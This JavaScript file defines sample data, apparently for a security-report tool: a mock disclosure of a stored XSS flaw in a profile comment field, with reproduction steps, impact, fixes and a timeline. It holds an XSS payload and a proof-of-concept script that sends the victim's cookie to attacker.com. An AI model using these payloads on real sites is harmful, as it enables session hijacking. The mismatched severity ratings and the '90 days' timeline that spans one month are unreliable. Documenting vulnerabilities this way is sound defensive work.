// Sample data for demonstration purposes
const SAMPLE_REPORT = {
  "reporter": {
    "name": "Jane Security Researcher",
    "email": "jane@example.com",
    "handle": "@janesec",
    "pgp": "0x1234ABCD",
    "disclosure": "Responsible"
  },
  "vulnerability": {
    "title": "Cross-Site Scripting (XSS) in User Profile Comments",
    "summary": "A stored XSS vulnerability was discovered in the user profile comment feature. Malicious JavaScript can be injected through the comment field and will execute when any user views the affected profile.\n\n**Affected Component:** `/user/profile/comments`\n\n**Attack Vector:** Network-based, requires user interaction",
    "category": "Client State Manipulation > Cross-Site Scripting (XSS) > Stored",
    "owasp": "A03:2021 – Injection",
    "severity": "High",
    "cvss": {
      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
      "score": "5.4",
      "severity": "Medium"
    },
    "steps": "1. Navigate to `https://example.com/user/profile/edit`\n2. In the \"Bio\" or \"Comment\" field, inject the following payload:\n   ```html\n   <img src=x onerror=\"alert('XSS')\">\n   ```\n3. Save the profile\n4. Visit your public profile page or have another user visit it\n5. The JavaScript payload executes in the victim's browser context\n\n**Proof of Concept:**\n```javascript\n<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>\n```",
    "observables": [
      "https://example.com/user/profile/123",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      "Cookie: session=abc123xyz"
    ],
    "impact": "**High Impact:**\n\n- Attackers can steal session cookies and hijack user accounts\n- Malicious scripts can perform actions on behalf of victims\n- Sensitive data can be exfiltrated from the victim's browser\n- Potential for widespread phishing campaigns via trusted profiles\n- Reputational damage to the platform",
    "mitigation": "**Recommended Fixes:**\n\n1. **Input Sanitization:** Implement strict HTML/JavaScript filtering on all user-generated content\n2. **Output Encoding:** Properly encode all dynamic content before rendering in HTML context\n3. **Content Security Policy (CSP):** Deploy a restrictive CSP header to prevent inline script execution\n4. **Use Framework Protections:** Leverage built-in XSS protections in modern frameworks (e.g., React, Angular)\n\n**Example Fix (Python/Flask):**\n```python\nfrom markupsafe import escape\nuser_comment = escape(request.form.get('comment'))\n```\n\n**Additional Recommendations:**\n- Implement rate limiting on profile updates\n- Add CAPTCHA for sensitive operations\n- Enable logging and monitoring for suspicious payloads",
    "notes": "This vulnerability was tested in a controlled environment with permission. No actual user data was accessed or exfiltrated. The issue has been responsibly disclosed and is pending remediation.\n\n**Disclosure Timeline:**\n- 2024-01-15: Vulnerability discovered\n- 2024-01-16: Initial report submitted\n- 2024-01-20: Vendor acknowledged issue\n- 2024-02-01: Fix deployed to production\n- 2024-02-15: Public disclosure (90 days)"
  },
  "screenshots": [],
  "exportSettings": {
    "pageSize": "a4",
    "headerText": "CONFIDENTIAL - Security Vulnerability Report",
    "footerText": "© 2025 Security Research Team | Responsible Disclosure",
    "headerImage": "",
    "footerImage": "",
    "includeReporter": true
  }
};

window.SAMPLE_REPORT = SAMPLE_REPORT;
